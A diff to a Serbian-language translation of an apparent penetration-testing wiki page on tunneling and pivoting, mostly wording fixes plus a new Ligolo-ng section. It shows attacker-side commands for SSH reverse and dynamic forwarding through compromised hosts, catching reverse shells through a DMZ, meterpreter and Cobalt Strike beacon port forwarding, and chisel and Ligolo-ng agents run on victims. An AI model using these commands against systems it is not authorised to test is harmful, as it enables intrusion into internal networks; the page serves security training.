@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** i **SYN** skeniranja ne mogu biti tunelovana kroz socks proksije, tako da moramo **onemogućiti ping otkrivanje** (`-Pn`) i odrediti **TCP skeniranja** (`-sT`) da bi ovo radilo.
+**ICMP** i **SYN** skeniranja ne mogu se tunelovati kroz socks proksije, tako da moramo **onemogućiti ping otkrivanje** (`-Pn`) i odrediti **TCP skeniranja** (`-sT`) da bi ovo radilo.
 {% endhint %}
 
 ## **Bash**
@@ -69,12 +69,12 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Обратно прослеђивање порта
+### Обратно пренос порта
 
-Ово је корисно за добијање обрнутог шелла изнутра хостова преко DMZ-а до вашег хоста:
+Ово је корисно за добијање обрнутог шелла изнутарних хостова преко DMZ-а до вашег хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -104,7 +104,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 Možete **tunelovati** putem **ssh** sav **saobraćaj** ka **podmreži** kroz host.\
-Na primer, prosleđivanje savremenog saobraćaja koji ide ka 10.10.10.0/24
+Na primer, proslediti sav saobraćaj koji ide ka 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Lokalni port --> Kompromitovani host (aktivna sesija) --> Treća\_kutija:Port
+Lokalni port --> Kompromitovana mašina (aktivna sesija) --> Treća\_mašina:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otvorite port na teamserver-u koji sluša na svim interfejsima koji se mogu koristiti za **usmeravanje saobraćaja kroz beacon**.
+Otvorite port na teamserver-u koji sluša na svim interfejsima i koji se može koristiti za **usmeravanje saobraćaja kroz beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje na Team Server i odatle na navedeni host:port
+U ovom slučaju, **port je otvoren na beacon host-u**, a ne na Team Server-u, a saobraćaj se šalje na Team Server, a odatle na navedeni host:port
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -206,6 +206,42 @@ Morate koristiti **istu verziju za klijenta i server**
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Koristite istu verziju za agenta i proxy**
+
+### Tunneling
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Veza i Slušanje
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -366,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite na žrtvi **SSH** servis da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
+Sada, ako na primer postavite na žrtvi **SSH** servis da sluša na portu 443. Možete se povezati na njega kroz port napadača 2222.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -416,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Promena proxychains DNS
 
-Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **default-u** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju** možete postaviti IP **domen kontrolera**.
+Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz socks proxy. Po **default-u** DNS server koji proxychains koristi je **4.2.2.2** (hardkodiran). Da biste ga promenili, uredite datoteku: _/usr/lib/proxychains3/proxyresolv_ i promenite IP. Ako ste u **Windows okruženju**, možete postaviti IP **domen kontrolera**.
 
 ## Tunneli u Go
 
